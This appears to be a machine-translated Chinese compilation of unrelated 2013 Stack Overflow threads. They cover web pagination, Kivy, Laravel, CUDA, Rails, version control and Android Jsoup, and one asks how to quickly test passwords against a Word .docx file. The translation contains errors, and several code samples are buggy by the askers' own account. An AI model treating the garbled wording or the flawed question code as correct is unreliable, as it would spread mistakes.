如果您的代码在仅包含 main.pde、ClassFile1.pde 和 ClassFile2.pde 的 PDE 中运行，并且您没有转义到源代码中的纯 Java 来执行您也可以在 Processing 中执行的操作，那么它将运行使用 Processing.js

# javascript - 如何在分页中突出显示当前页码？

> ID：16122661
> 
> 赞同：0
> 
> 时间：2013-04-20T16:34:53.703
> 
> 标签：javascript, css

我已经为我的页面制作了一个自定义的 java 脚本+css 分页，我想突出显示当前页码，showonlyone() 是一个 java 脚本函数，它显示隐藏在 css 中的 div 编号 ID 中的隐藏文本。我需要 o使分页突出显示工作（将 .but css 背景颜色更改为 #720000 ）

我的代码：

```
<div class="butpos">
Page:

<a id="bt1" href="javascript:showonlyone('post1');"  class="but"><span>1</span></a>                                         
<a id="bt2" href="javascript:showonlyone('post2');"  class="but"><span>2</span></a>                                          
<a id="bt3" href="javascript:showonlyone('post3');"  class="but"><span>3</span> </a>
<a id="bt4" href="javascript:showonlyone('post4');"  class="but"><span>4</span></a>
<a id="bt5" href="javascript:showonlyone('post5');"  class="but"><span>5</span></a>
</div> 
```

我尝试了一个带有 Id 的纯 css 方法：

```
.bt1 a#bt1,
.bt2 a#bt2,
.bt3 a#bt3,
.bt4 a#bt4,
.bt4 a#bt5
{
    background-color: #720000;
} 
```

第二种使用 css “current” 选择器的方法：

```
.but a.current{background-color:#720000;} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T16:38:11.587

加载 jQuery：在你的 </body> 之前添加这个

```
<script src="http://code.jquery.com/jquery-1.9.1.min.js"></script> 
```

HTML

```
<div class="butpos">
    <a id="bt1" href="#" data-post-id="1" class="but"><span>1</span></a>                                         
    <a id="bt2" href="#" data-post-id="2" class="but"><span>2</span></a>                                         
    <a id="bt3" href="#" data-post-id="3" class="but"><span>3</span></a>                                         
    <a id="bt4" href="#" data-post-id="4" class="but"><span>4</span></a>                                         
    <a id="bt5" href="#" data-post-id="5" class="but"><span>5</span></a>                                         
</div> 
```

JS

```
function showonlyone(postId) {
    // Your current showonlyone() code
    // (rename 'postId' to the param name of your function
}

$(document).ready(function() {
    $('.but', '.butpos').each(function() {
        $(this).on('click', function() {
            $('.but.current', '.butpos').removeClass('current');
            $(this).addClass('current');

            showonlyone($(this).data('postId'));

            return false;
        });
    });
}); 
```

CSS

```
.but {
    background-color: #0f0;
}

.current {
    background-color: #720000;
} 
```

示例： http: [//fiddle.jshell.net/DNkap/](http://fiddle.jshell.net/DNkap/)

# python-2.7 - Kivy 的 ScrollView 中的 TreeView - 无滚动

> ID：16122664
> 
> 赞同：2
> 
> 时间：2013-04-20T16:34:58.047
> 
> 标签：python-2.7, kivy

我正在开发一个 kivy 应用程序，该应用程序从 sqlite3 数据库中提取数据并用它填充 TreeView。当我展开几个组时，TreeView 变得太大而无法在我的屏幕上显示，所以我想将它放在 ScrollView 中，这样我仍然可以向下滚动并查看已离开屏幕底部的项目。我可以让一个基本的 ScrollView 工作，但是当我将 TreeView 放入其中时，没有滚动并且我的 TreeView 的顶部不在我的屏幕顶部。

我已将代码精简为这个没有 .kv 文件运行的问题的工作示例：

```
from kivy.uix.scrollview import ScrollView
from kivy.uix.gridlayout import GridLayout
from kivy.core.window import Window
from kivy.uix.widget import Widget
from kivy.uix.treeview import TreeView, TreeViewNode
from kivy.uix.treeview import TreeViewLabel
from kivy.app import App
from kivy.properties import ObjectProperty, StringProperty
from kivy.uix.button import Button

class TreeViewButton(Button, TreeViewNode):
    pass

modGroups = [u'Fruit', u'Fruit', u'Meat', u'Dairy', u'Dairy', u'Fruit']
modItems = [u'Apple', u'Pear', u'Spam', u'Egg', u'Milk', u'Banana']
modDict = dict()
modDictUnique = dict()

def populate_tree_view(tv):
    modDict = zip(modGroups, modItems)
    print modGroups
    print modItems
    for k, v in modDict:
        if k not in modDictUnique:
            modDictUnique[k] = [v]
        else:
            modDictUnique[k].append(v)
    sortedGroups = modDictUnique.keys()
    sortedGroups.sort()
    #print modItems
    #print modDictUnique
    n = tv.add_node(TreeViewLabel(text='Food', is_open=True))
    for group in sortedGroups:
        g = tv.add_node(TreeViewLabel(text='%s' % group), n)
        for item in modDictUnique[group]:
            tv.add_node(TreeViewButton(text='%s' % item), g)

class POSFMApp(App):

    def build(self):
        layout = GridLayout(cols=1, spacing=50, size_hint_y=None,width=800)
        layout.bind(minimum_height=layout.setter('height'))
        #for i in range(30):
        #    btn = Button(text=str(i), size=(480, 40),
        #                 size_hint=(None, None))
        #    layout.add_widget(btn)
        tv = TreeView(root_options=dict(text='Tree One'), hide_root=True, indent_level=4, minimum_height=5000)
        populate_tree_view(tv)
        layout.add_widget(tv)
        root = ScrollView(size_hint=(None, None), size=(800, 700))
        root.center = Window.center
        root.add_widget(layout)
        return root

if __name__ == '__main__':
    POSFMApp().run() 
```

在我的实际应用程序中，modGroups 和 modItems 是从 sqlite3 数据库中填充的，但是这个示例提出了问题，而不必乱用 sqlite3。我输入了（注释掉的）行：

```
#for i in range(30):
#    btn = Button(text=str(i), size=(480, 40),
#                 size_hint=(None, None))
#    layout.add_widget(btn) 
```

从这个[kivy ScrollView 示例](https://github.com/kivy/kivy/blob/master/examples/widgets/scrollview.py)中显示，如果我取消注释这些行并注释掉关于我的 TreeView 的三行

```
tv = TreeView(root_options=dict(text='Tree One'), hide_root=True, indent_level=4, minimum_height=5000)
populate_tree_view(tv)
layout.add_widget(tv) 
```

然后，当我使用鼠标的滚轮时，我可以得到一个正常工作的 ScrollView，其右侧有一个滚动条。

我最好的猜测是 TreeView 没有告诉 ScrollView 它垂直的长度，所以 ScrollView 没有意识到它需要在 y 轴上滚动。不过，这只是一个猜测。

如何让 TreeView 在 ScrollView 内工作，以便可以滚动（尤其是在 y 轴上）通过 TreeView？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-26T00:08:20.350

a) 仅为一个孩子使用[GridLayout](http://kivy.org/docs/api-kivy.uix.gridlayout.html)，请不要。我会假设它是从何时/如果您添加更多孩子时遗留下来的。

b) [TreeView](http://kivy.org/docs/api-kivy.uix.treeview.html)的文档表明它具有[minimun_height](http://kivy.org/docs/api-kivy.uix.treeview.html#kivy.uix.treeview.TreeView.minimum_height)属性，该属性指示容纳所有子项所需的最小宽度/高度。[Treeview](http://kivy.org/docs/api-kivy.uix.treeview.html)不会根据孩子的数量自行改变它的高度。您应该（在这种情况下）将[TreeView](http://kivy.org/docs/api-kivy.uix.treeview.html)的高度更新为它的[minimum_height](http://kivy.org/docs/api-kivy.uix.treeview.html#kivy.uix.treeview.TreeView.minimum_height) ... `tv.bind(minimum_height=tv.setter('height'))` c）考虑到上述几点提供的信息，您可以这样做：

```
tv = TreeView(root_options=dict(text='Tree One'), hide_root=True, indent_level=4)
tv.size_hint = 1, None
tv.bind(minimum_height = tv.setter('height'))
populate_tree_view(tv)
root = ScrollView(pos = (0, 0))
root.add_widget(tv) 
```

这是包含这些更改的完整代码，因此可以将代码复制并粘贴到 .py 文件中并运行它。

```
from kivy.uix.scrollview import ScrollView
from kivy.uix.gridlayout import GridLayout
from kivy.core.window import Window
from kivy.uix.widget import Widget
from kivy.uix.treeview import TreeView, TreeViewNode
from kivy.uix.treeview import TreeViewLabel
from kivy.app import App
from kivy.properties import ObjectProperty, StringProperty
from kivy.uix.button import Button

class TreeViewButton(Button, TreeViewNode):
    pass

modGroups = [u'Fruit', u'Fruit', u'Meat', u'Dairy', u'Dairy', u'Fruit']
modItems = [u'Apple', u'Pear', u'Spam', u'Egg', u'Milk', u'Banana']
modDict = dict()
modDictUnique = dict()

def populate_tree_view(tv):
    modDict = zip(modGroups, modItems)
    print modGroups
    print modItems
    for k, v in modDict:
        if k not in modDictUnique:
            modDictUnique[k] = [v]
        else:
            modDictUnique[k].append(v)
    sortedGroups = modDictUnique.keys()
    sortedGroups.sort()
    #print modItems
    #print modDictUnique
    n = tv.add_node(TreeViewLabel(text='Food', is_open=True))
    for group in sortedGroups:
        g = tv.add_node(TreeViewLabel(text='%s' % group), n)
        for item in modDictUnique[group]:
            tv.add_node(TreeViewButton(text='%s' % item), g)

class POSFMApp(App):

    def build(self):
        #for i in range(30):
        #    btn = Button(text=str(i), size=(480, 40),
        #                 size_hint=(None, None))
        #    layout.add_widget(btn)
        tv = TreeView(root_options=dict(text='Tree One'), hide_root=True, indent_level=4)
        tv.size_hint = 1, None
        tv.bind(minimum_height = tv.setter('height'))
        populate_tree_view(tv)
        root = ScrollView(pos = (0, 0))
        root.add_widget(tv)
        return root

if __name__ == '__main__':
    POSFMApp().run() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-08-18T16:06:14.207

将高度添加到 TreeView 然后它将滚动。像这样。

```
ScrollView:
            id: kr_scroll
            do_scroll_x: False
            TreeView:
                id: trvMenu
                root_options: { 'text': 'Home', 'font_size': 15}
                hide_root: False
                indent_level: 4
                size_hint_y: None
                height: self.parent.height*2 
```

# php - 数据在表中后，Laravel Migration 添加字段？

> ID：16122666
> 
> 赞同：5
> 
> 时间：2013-04-20T16:34:59.797
> 
> 标签：php, mysql, migration, laravel

我有一个名为的迁移`CreateItemsTable`；我运行了它，我在那个表中有项目，现在我需要在表中添加一个新字段。我不能只在迁移文件中添加一个字段`migrate:refresh`因为我需要其中的数据。

我应该为添加字段进行另一次迁移吗？当我在开发中测试东西时，这似乎很混乱，我可能会改变很多领域。我不确定迁移是否比 PhpMyAdmin 更干净......或者我不理解它们？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-20T16:39:06.753

是的，每次您需要以某种方式更改表时，您都会为其创建一个新的迁移。这就是迁移的全部意义所在。当您在协作环境中开发并从远程存储库中提取一些更改时，您应该做的一件事（如果使用数据库）是运行其他开发人员可能创建的任何迁移。这使您的数据库保持同步。

当然，您可能偶尔会删除和添加列，但这没什么大不了的。

当您第一次创建表时，您可能正在使用`Schema::create()`. 该表的所有后续迁移都应使用`Scheme::table()`. 它接受相同的参数，只是它不尝试先创建表。

# cuda - 通过 cuda 内核缩减找到最小值和最大值

> ID：16122669
> 
> 赞同：0
> 
> 时间：2013-04-20T16:35:12.143
> 
> 标签：cuda

这是我的内核代码

```
typedef unsigned char Npp8u;
...
    // Kernel Implementation
__device__ unsigned int min_device;
__device__ unsigned int max_device;

__global__ void findMax_Min(Npp8u * data, int numEl){
    int index = blockDim.x*blockIdx.x + threadIdx.x;
    int shared_index = threadIdx.x;

    __shared__ Npp8u data_shared_min[BLOCKDIM];
    __shared__ Npp8u data_shared_max[BLOCKDIM];

    // check index condition
    if(index < numEl){
        data_shared_min[shared_index] = data[index]; //pass values from global to shared memory
        __syncthreads();
        data_shared_max[shared_index] = data[index]; //pass values from global to shared memory

        for (unsigned int stride = BLOCKDIM/2; stride > 0; stride >>= 1) {
            if(threadIdx.x <  stride){
                if(data_shared_max[threadIdx.x] <  data_shared_max[threadIdx.x+stride]) data_shared_max[shared_index] = data_shared_max[shared_index+stride];
                if(data_shared_min[threadIdx.x]>  data_shared_min[threadIdx.x+stride]) data_shared_min[shared_index] = data_shared_min[shared_index+stride];
            }
            __syncthreads();
        }
        if(threadIdx.x == 0  ){
            atomicMin(&(min_device), (unsigned int)data_shared_min[threadIdx.x ]);
            //min_device =10;
            __syncthreads();
            atomicMax(&(max_device), (unsigned int)data_shared_max[threadIdx.x ]);
        }
    }else{
        data_shared_min[shared_index] = 9999;
    }
} 
```

我有一个 512x512 的图像，我想找到最小和最大像素值。`data`是图像的一维版本。此代码适用于最大值但不适用于最小值。正如我从 matlab 中检查的那样，最大值为 202，最小值为 10，但它发现最小值为 0。这是我的内核代码和 memcpy 调用

```
int main(){
    // Host parameter declarations.
    Npp8u * imageHost;
    int   nWidth, nHeight, nMaxGray;

    // Load image to the host.
    std::cout << "Load PGM file." << std::endl;
    imageHost = LoadPGM("lena_before.pgm", nWidth, nHeight, nMaxGray);

    // Device parameter declarations.
    Npp8u    * imageDevice;
    unsigned int   max, min;
    size_t size = sizeof(Npp8u)*nWidth*nHeight;

    cudaMalloc((Npp8u**)&imageDevice, size);

    cudaMemcpy(imageDevice, imageHost, size, cudaMemcpyHostToDevice);

    int numPixels = nWidth*nHeight;

    dim3 numThreads(BLOCKDIM);
    dim3 numBlocks(numPixels/BLOCKDIM + (numPixels%BLOCKDIM == 0 ? 0 : 1));

    findMax_Min<<<numBlocks, numThreads>>>(imageDevice,numPixels);
    cudaMemcpyFromSymbol(&max,max_device, sizeof(max_device), 0, cudaMemcpyDeviceToHost);
    cudaMemcpyFromSymbol(&min,min_device, sizeof(min_device), 0, cudaMemcpyDeviceToHost);

    printf("Min value for image : %i\n", min);
    printf("Max value for image : %i\n", max);
... 
```

另一个有趣的事情是在内核调用之后更改顺序`cudaMemcpy`也会导致故障并且值都被读取为零。我没有看到问题。有没有人看到被阻塞的部分？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T17:31:49.863

您可能想要进行 cuda 错误检查。您可能还希望初始化`min_device`为一个较大的值和`max_device`零。您的缩减方法还有其他与步幅相关的问题（当您将步幅添加到 threadIdx.x 时，奇数大小图像的最后一个块会发生什么，它可能超出共享内存中定义的图像范围），但我不认为这对 512x512 图像很重要。如果`min_device`只是碰巧从零开始，那么您所有的 atomicMin 操作将始终将零留在那里。

您可以尝试初始化`min_device`，`max_device`如下所示：

```
__device__ unsigned int min_device = 9999;
__device__ unsigned int max_device = 0; 
```

对于最后的 cudamemcpy 调用，您将 4 个字节（max_device 的大小）复制到一个单字节变量（Npp8u max）中，同样用于 min。所以这是个问题。由于您使用的是指针，因此复制操作肯定会覆盖您不想要的内容。如果编译器按照您定义变量的方式顺序存储变量，则一个复制操作会覆盖另一个变量，我认为这可以解释您所看到的行为。如果您创建`min`并`max`作为`unsigned int`数量，我认为这个问题会消失。

**编辑：**由于您没有显示实际的块尺寸，因此您可能仍然对减少有问题。您可能想要更改此行：

```
 if(threadIdx.x <  stride){ 
```

类似于：

```
 if((threadIdx.x <  stride) && ((index + stride)< numEl)){ 
```

这个或类似的东西应该可以纠正我在第一段中提到的危险。我猜你是想用这条线来解释危险：

```
 data_shared_min[shared_index] = 9999; 
```

但是不能保证在共享内存中设置的数据元素被其他线程读取之前执行代码行。我也不知道当您将 9999 值分配给字节数量时会发生什么，但这可能不是您所期望的。

# python - 使用 Python 检查 MS Word 文档（docx）的密码

> ID：16122671
> 
> 赞同：4
> 
> 时间：2013-04-20T16:35:42.000
> 
> 标签：python, ms-word, passwords, docx, password-recovery

我正在尝试在 python(2.7) 中编写一个程序来查找 MS word(docx) 文档的密码。我需要的是找到一种方法来检查给定的密码是否与文档的密码匹配，并且应该快速检查。

**我可以使用哪个模块/方式来检查特定密码是否与 MS-Word 文档的密码匹配？**

# ruby-on-rails - Rails：带有关联和 OR 运算符的 ActiveRecord 查询

> ID：16122672
> 
> 赞同：1
> 
> 时间：2013-04-20T16:35:42.720
> 
> 标签：ruby-on-rails, model-associations, or-operator

我似乎找不到以下查询的“Rails-Way”：

这是我的模型定义：

```
class Backend::Order < ActiveRecord::Base
  has_one :backend_order_filter, :class_name => 'Backend::OrderFilter', :dependent => :destroy

class Backend::OrderFilter < ActiveRecord::Base
  belongs_to :backend_order, :class_name => 'Backend::Order', :foreign_key => 'order_id' 
```

这是我的原始工作 sql 查询：

```
Backend::Order.find_by_sql(
    "SELECT `backend_orders`.*,`backend_order_filters`.*,`backend_customers`.*
      FROM `backend_orders`
      LEFT JOIN `backend_order_filters` ON (`backend_orders`.`id` = `backend_order_filters`.`order_id`)
      WHERE
          (`backend_orders`.`order_status` IN ('OK', 'AO') OR `backend_orders`.`order_status` IS NULL) AND
          (`backend_order_filters`.`financing` = 1 OR (`backend_orders`.`price` - `backend_orders`.`balance`) <= 0)AND
          `backend_orders`.`delivery_number` IN ('21','22') AND (`backend_order_filters`.`places_of_delivery` = 1)"
) 
```

由于“Backend::Order”和“Backend::OrderFilter”之间的 OR 运算符，我尝试使用 Arel-tables 执行此操作，但我找不到解决方案。我还在 Stack Overflow 上搜索过类似的问题，但不幸的是我运气不好。所有关于 Arel 表的答案都只考虑一个没有关联的主要模型。感谢您的任何帮助。

# version-control - 单机单用户免费版本控制

> ID：16122673
> 
> 赞同：3
> 
> 时间：2013-04-20T16:35:51.927
> 
> 标签：version-control

有一些类似的问题，但其中一些已经有 5 年历史了（所以可能会有更好的新东西），而其他的并不能满足我的所有要求。

我正在寻找有关版本控制软件的建议。

*   必须免费用于商业用途。
*   所有开发将由一个人完成。
*   所有开发都将在一台机器上完成 - 64 位 Windows 7 机器。
*   许多小项目——每个项目都很小——只需要几个星期的工作。所以启动一个新项目应该很快。
*   应该有一个用于签入的命令行。
*   应该有一种图形方式来查看文件的版本历史记录 - 即我输入“history file.cpp” - 它应该给我一个包含该文件所有版本的窗口和一个简单的方法让我做一个视觉差异（带有pluggable difftool - 我喜欢历史上任何两个版本的windiff）。
*   这项工作将涉及不同的编程语言（C、C++、Java、VBScript 等）。
*   IDE 集成根本不需要。
*   创建标签/标签应该快速简单。
*   永远不会进行合并和分支，因此与这些相关的任何功能都不相关。
*   永远不需要解决冲突。
*   基本东西的快速学习曲线。
*   应该有一个命令来签入一个目录下的所有签出文件，包括子目录。这应该不会在运行命令时引发 UI 的情况下发生。即所有文件共有的注释应该从命令行接受。

> 即 checkin -r *.cpp -c “添加了新的东西”。

*   我喜欢我使用的 perforce 客户端中的一些功能
    *   虽然有一个结帐命令，但我也可以在不结帐的情况下强制保存文件并继续工作。然后只运行一个命令搜索目录/子目录中的所有文件，这些文件已被强制保存并为您签出。
*   不应该要求我在存储库中添加新目录。在目录中添加文件应该会自动添加目录 - 即我需要在新目录中创建一个新文件 A.java。我会做

    ```
    md new
    cd new
    // edit and create the file A.java
    // create and checkin the new file A.java into the repository 
    // without complaining that the directory doesn't exist in the repository. 
    ```

*   应该很容易备份。即每周一次，我使用 SyncToy 将内容备份到外部硬盘。我不介意使用不同的方式将版本控制存储库备份到外部硬盘中，但备份应该很简单——万一我的笔记本电脑崩溃了，我应该能够从备份中重新创建所有存储库，包括版本历史记录。

*   我正在寻找轻量级的东西。即不需要我设置单独的服务器等。

在多开发人员大型项目环境中的不同时间，我使用过 perforce 和 CVS - 非常喜欢 perforce。从来不喜欢 CVS，但使用 CVS 的 Tortoise UI 让它可以忍受。

然而，对于这些版本控制系统，我一直是用户——从来不是管理员（即开发人员不管理版本控制系统——有单独的版本控制专家）——即我从未创建过新的存储库——所以我的知识只是客户端的东西。

我知道任何一个系统都可能无法满足我的所有要求 - 但尽可能接近的东西会很棒。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T19:03:47.983

[免责声明：我将 SVN 用于我的工作和个人项目，并且没有使用 Mercurial 的经验。]

大多数流行的版本控制系统都能满足您的大多数需求。

在阅读有关不添加目录的项目之前，我将建议使用 SVN。据我从 Mercurial 哲学的描述中回忆，它管理文件，而不是目录，因此在添加文件时它会自动添加任何丢失的目录。

当然，任何流行的版本控制系统都可以实现这样的东西，但如果你正在寻找开箱即用的这样的功能，可能你想检查 Mercurial...

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-20T21:12:40.633

虽然*这里的主题***很** 离题，但我会尝试

 **   颠覆（[TortoiseSVN](http://tortoisesvn.net/)和 file:/// 存储库协议）
*   Mercurial ( [TortoiseHG](http://tortoisehg.bitbucket.io/) )
*   [FossilSCM](http://www.fossil-scm.org)（带[燃料](http://code.google.com/p/fuel-scm/)）*

# java - 将图像从网站加载到 Android 应用程序

> ID：16122678
> 
> 赞同：1
> 
> 时间：2013-04-20T16:36:11.630
> 
> 标签：java, android, listview, jsoup

我正在尝试使用 Jsoup 从网站加载一些图像。我的应用程序不断崩溃。我认为是因为这条线：

```
Elements divs =((Elements) doc).select("img[src$=.jpg]"); 
```

这是 LoadImages 类的代码：

```
public class LoadImages extends AsyncTask {

    private ArrayAdapter adapter;

private ArrayList list;

    public LoadImages(ArrayList list, Adapter adapter)
    {
        this.list = list;
        this.adapter = (ArrayAdapter) adapter;
    }

    protected void onPostExecute(Elements divs) {
        // TODO Auto-generated method stub
        super.onPostExecute(divs);
         for (org.jsoup.nodes.Element div : divs)
         {   
            list.add(div);
        }
        adapter.notifyDataSetChanged();

    }

    @Override
    protected Object doInBackground(Object... params) {
        Document doc = null;

        try {

        doc = (Document) Jsoup.connect("http://mongol.co.il/").get();
        Elements divs =((Elements) doc).select("img[src$=.jpg]");

         } catch (IOException e1) {

        e1.printStackTrace(); }
        return null;

    }

} 
```

这也是 Main 类：

```
public class MainActivity extends Activity{

    private ListView listView;
    private ArrayAdapter adapter;
    private ArrayList list;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);
        setContentView(R.layout.listview);
         listView = (ListView) findViewById( R.id.listview); 
         list = new ArrayList();
          adapter = new ArrayAdapter(this,
                android.R.layout.simple_list_item_1, list);

            listView.setAdapter(adapter);
            new LoadImages(list, adapter).execute();

    }
} 
```

为什么会崩溃？

```
04-20 12:52:38.089: I/global(400): Default buffer size used in BufferedInputStream constructor. It would be better to be explicit if an 8k buffer is required.
04-20 12:52:38.539: D/dalvikvm(400): GC_FOR_MALLOC freed 1781 objects / 98016 bytes in 115ms
04-20 12:52:38.649: D/dalvikvm(400): GC_FOR_MALLOC freed 252 objects / 143016 bytes in 95ms
04-20 12:52:38.820: D/dalvikvm(400): GC_FOR_MALLOC freed 90 objects / 434944 bytes in 156ms
04-20 12:52:38.939: D/dalvikvm(400): GC_FOR_MALLOC freed 8 objects / 194848 bytes in 95ms
04-20 12:52:38.949: I/dalvikvm-heap(400): Grow heap (frag case) to 3.288MB for 389136-byte allocation
04-20 12:52:39.119: D/dalvikvm(400): GC_FOR_MALLOC freed 0 objects / 0 bytes in 166ms
04-20 12:52:39.269: D/dalvikvm(400): GC_FOR_MALLOC freed 44 objects / 390808 bytes in 146ms
04-20 12:52:39.659: D/dalvikvm(400): GC_FOR_MALLOC freed 1668 objects / 521136 bytes in 94ms
04-20 12:52:40.399: D/dalvikvm(400): GC_FOR_MALLOC freed 2484 objects / 134640 bytes in 90ms
04-20 12:52:40.699: D/dalvikvm(400): GC_FOR_MALLOC freed 4499 objects / 172528 bytes in 101ms
04-20 12:52:40.699: I/dalvikvm-heap(400): Grow heap (frag case) to 3.682MB for 287718-byte allocation
04-20 12:52:40.880: D/dalvikvm(400): GC_FOR_MALLOC freed 0 objects / 0 bytes in 176ms
04-20 12:52:41.559: D/dalvikvm(400): GC_FOR_MALLOC freed 6721 objects / 326776 bytes in 109ms
04-20 12:52:42.470: D/dalvikvm(400): GC_FOR_MALLOC freed 9512 objects / 399904 bytes in 122ms
04-20 12:52:43.219: D/dalvikvm(400): GC_FOR_MALLOC freed 9557 objects / 402640 bytes in 115ms
04-20 12:52:44.039: D/dalvikvm(400): GC_FOR_MALLOC freed 10870 objects / 452144 bytes in 138ms
04-20 12:52:44.902: D/dalvikvm(400): GC_FOR_MALLOC freed 11333 objects / 486376 bytes in 136ms
04-20 12:52:45.791: D/dalvikvm(400): GC_FOR_MALLOC freed 12106 objects / 505752 bytes in 148ms
04-20 12:52:45.958: D/AndroidRuntime(400): Shutting down VM
04-20 12:52:45.958: W/dalvikvm(400): threadid=1: thread exiting with uncaught exception (group=0x4001d800)
04-20 12:52:46.061: E/AndroidRuntime(400): FATAL EXCEPTION: main
04-20 12:52:46.061: E/AndroidRuntime(400): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.example.mongol/com.example.mongol.MainActivity}: java.lang.ClassCastException: org.jsoup.nodes.Document
04-20 12:52:46.061: E/AndroidRuntime(400):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2663)
04-20 12:52:46.061: E/AndroidRuntime(400):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2679)
04-20 12:52:46.061: E/AndroidRuntime(400):  at android.app.ActivityThread.access$2300(ActivityThread.java:125)
04-20 12:52:46.061: E/AndroidRuntime(400):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2033)
04-20 12:52:46.061: E/AndroidRuntime(400):  at android.os.Handler.dispatchMessage(Handler.java:99)
04-20 12:52:46.061: E/AndroidRuntime(400):  at android.os.Looper.loop(Looper.java:123)
04-20 12:52:46.061: E/AndroidRuntime(400):  at android.app.ActivityThread.main(ActivityThread.java:4627)
04-20 12:52:46.061: E/AndroidRuntime(400):  at java.lang.reflect.Method.invokeNative(Native Method)
04-20 12:52:46.061: E/AndroidRuntime(400):  at java.lang.reflect.Method.invoke(Method.java:521)
04-20 12:52:46.061: E/AndroidRuntime(400):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
04-20 12:52:46.061: E/AndroidRuntime(400):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)
04-20 12:52:46.061: E/AndroidRuntime(400):  at dalvik.system.NativeStart.main(Native Method)
04-20 12:52:46.061: E/AndroidRuntime(400): Caused by: java.lang.ClassCastException: org.jsoup.nodes.Document
04-20 12:52:46.061: E/AndroidRuntime(400):  at com.example.mongol.MainActivity.onCreate(MainActivity.java:56)
04-20 12:52:46.061: E/AndroidRuntime(400):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1047)
04-20 12:52:46.061: E/AndroidRuntime(400):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2627)
04-20 12:52:46.061: E/AndroidRuntime(400):  ... 11 more
04-20 12:52:49.409: I/Process(400): Sending signal. PID: 400 SIG: 9
04-20 15:39:54.631: W/KeyCharacterMap(429): No keyboard for id 0
04-20 15:39:54.710: W/KeyCharacterMap(429): Using default keymap: /system/usr/keychars/qwerty.kcm.bin
04-20 15:40:05.249: D/dalvikvm(429): GC_EXPLICIT freed 994 objects / 71000 bytes in 128ms
04-20 15:49:13.209: I/global(458): Default buffer size used in BufferedInputStream constructor. It would be better to be explicit if an 8k buffer is required.
04-20 15:49:13.439: D/dalvikvm(458): GC_FOR_MALLOC freed 1802 objects / 101888 bytes in 103ms
04-20 15:49:13.560: D/dalvikvm(458): GC_FOR_MALLOC freed 263 objects / 143728 bytes in 110ms
04-20 15:49:13.669: D/dalvikvm(458): GC_FOR_MALLOC freed 122 objects / 436400 bytes in 100ms
04-20 15:49:13.769: D/dalvikvm(458): GC_FOR_MALLOC freed 3 objects / 194656 bytes in 93ms
04-20 15:49:13.779: I/dalvikvm-heap(458): Grow heap (frag case) to 3.285MB for 389136-byte allocation
04-20 15:49:13.899: D/dalvikvm(458): GC_FOR_MALLOC freed 0 objects / 0 bytes in 116ms
04-20 15:49:14.009: D/dalvikvm(458): GC_FOR_MALLOC freed 44 objects / 390808 bytes in 100ms
04-20 15:49:14.739: D/dalvikvm(458): GC_FOR_MALLOC freed 1683 objects / 528096 bytes in 344ms
04-20 15:49:15.899: D/dalvikvm(458): GC_FOR_MALLOC freed 2471 objects / 125872 bytes in 136ms
04-20 15:49:16.298: D/dalvikvm(458): GC_FOR_MALLOC freed 4499 objects / 172424 bytes in 115ms
04-20 15:49:16.298: I/dalvikvm-heap(458): Grow heap (frag case) to 3.680MB for 287718-byte allocation
04-20 15:49:16.418: D/dalvikvm(458): GC_FOR_MALLOC freed 0 objects / 0 bytes in 112ms
04-20 15:49:17.469: D/dalvikvm(458): GC_FOR_MALLOC freed 6831 objects / 326392 bytes in 108ms
04-20 15:49:18.499: D/dalvikvm(458): GC_FOR_MALLOC freed 9478 objects / 399328 bytes in 122ms
04-20 15:49:19.869: D/dalvikvm(458): GC_FOR_MALLOC freed 9571 objects / 402800 bytes in 125ms
04-20 15:49:21.090: D/dalvikvm(458): GC_FOR_MALLOC freed 10892 objects / 452648 bytes in 251ms
04-20 15:49:22.429: D/dalvikvm(458): GC_FOR_MALLOC freed 11307 objects / 484816 bytes in 184ms
04-20 15:49:23.689: D/dalvikvm(458): GC_FOR_MALLOC freed 13250 objects / 550520 bytes in 244ms
04-20 15:49:23.849: W/dalvikvm(458): threadid=7: thread exiting with uncaught exception (group=0x4001d800)
04-20 15:49:23.979: E/AndroidRuntime(458): FATAL EXCEPTION: AsyncTask #1
04-20 15:49:23.979: E/AndroidRuntime(458): java.lang.RuntimeException: An error occured while executing doInBackground()
04-20 15:49:23.979: E/AndroidRuntime(458):  at android.os.AsyncTask$3.done(AsyncTask.java:200)
04-20 15:49:23.979: E/AndroidRuntime(458):  at java.util.concurrent.FutureTask$Sync.innerSetException(FutureTask.java:273)
04-20 15:49:23.979: E/AndroidRuntime(458):  at java.util.concurrent.FutureTask.setException(FutureTask.java:124)
04-20 15:49:23.979: E/AndroidRuntime(458):  at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:307)
04-20 15:49:23.979: E/AndroidRuntime(458):  at java.util.concurrent.FutureTask.run(FutureTask.java:137)
04-20 15:49:23.979: E/AndroidRuntime(458):  at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1068)
04-20 15:49:23.979: E/AndroidRuntime(458):  at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:561)
04-20 15:49:23.979: E/AndroidRuntime(458):  at java.lang.Thread.run(Thread.java:1096)
04-20 15:49:23.979: E/AndroidRuntime(458): Caused by: java.lang.ClassCastException: org.jsoup.nodes.Document
04-20 15:49:23.979: E/AndroidRuntime(458):  at com.example.mongol.LoadImages.doInBackground(LoadImages.java:42)
04-20 15:49:23.979: E/AndroidRuntime(458):  at android.os.AsyncTask$2.call(AsyncTask.java:185)
04-20 15:49:23.979: E/AndroidRuntime(458):  at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:305)
04-20 15:49:23.979: E/AndroidRuntime(458):  ... 4 more
04-20 15:49:37.699: I/Process(458): Sending signal. PID: 458 SIG: 9
